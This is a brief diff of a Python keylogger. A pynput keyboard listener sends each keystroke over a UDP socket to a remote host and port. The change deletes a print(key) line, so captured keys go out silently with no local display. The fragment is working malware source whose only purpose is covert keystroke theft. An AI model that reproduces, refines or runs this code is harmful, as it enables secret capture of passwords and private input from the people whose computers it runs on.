@@ -11,7 +11,6 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 server_address = (host, port)
 
 def on_press(key):
-    print(key) 
     sock.sendto(str(key).encode('utf-8'), server_address)
 
 with Listener(on_press=on_press) as listener:
